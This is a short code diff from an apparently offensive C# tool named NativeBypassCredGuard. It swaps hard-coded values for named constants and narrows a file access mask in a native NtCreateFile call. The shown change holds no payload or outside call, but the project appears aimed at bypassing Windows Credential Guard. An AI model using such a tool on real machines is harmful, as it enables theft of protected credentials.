@@ -12,6 +12,10 @@ namespace NativeBypassCredGuard
         public const uint TOKEN_QUERY = 0x00000008;
         public const uint FILE_OPEN = 0x00000001;
         public const uint FILE_SHARE_READ = 0x00000001;
+        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
+        public const uint FILE_READ_DATA = 0x1;
+        public const uint FILE_READ_ATTRIBUTES = 0x8;
+
 
         [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID Luid; public uint Attributes; }
 
@@ -172,14 +176,14 @@ namespace NativeBypassCredGuard
             objectAttributes.RootDirectory = IntPtr.Zero;
             objectAttributes.ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf<UNICODE_STRING>());
             Marshal.StructureToPtr(unicodeString, objectAttributes.ObjectName, false);
-            objectAttributes.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE
+            objectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
             objectAttributes.SecurityDescriptor = IntPtr.Zero;
             objectAttributes.SecurityQualityOfService = IntPtr.Zero;
 
             // IntPtr fileHandle;
             uint status = NtCreateFile(
                out fileHandle,
-               0x00120089,
+               FILE_READ_DATA  | FILE_READ_ATTRIBUTES,// 0x0009, //0x00120089,
                ref objectAttributes,
                out _,
                IntPtr.Zero,
